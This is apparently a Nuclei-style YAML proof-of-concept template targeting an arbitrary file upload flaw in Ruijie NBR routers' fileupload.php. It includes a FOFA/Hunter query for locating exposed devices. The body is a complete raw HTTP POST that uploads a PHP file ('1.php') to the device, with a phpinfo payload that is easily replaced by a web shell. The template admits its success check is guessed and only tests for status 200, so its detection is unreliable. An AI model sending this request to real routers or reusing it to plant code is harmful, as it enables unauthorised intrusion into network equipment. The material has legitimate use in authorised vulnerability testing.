id: poc-c73478595927860ef934
info:
  name: 锐捷NBR路由器fileupload.php任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c73478595927860ef93405694da7df85

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: c73478595927860ef93405694da7df85
    fofa: + hunter`app.name=="Ruijie 锐捷 EWEB"`
http:
- raw:
  - 'POST /ddi/server/fileupload.php HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close

    Content-Length: 219


    --00content0boundary00

    Content-Disposition: form-data; name="uploadDir"


    upload

    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="1.php"


    <?php phpinfo();?>

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
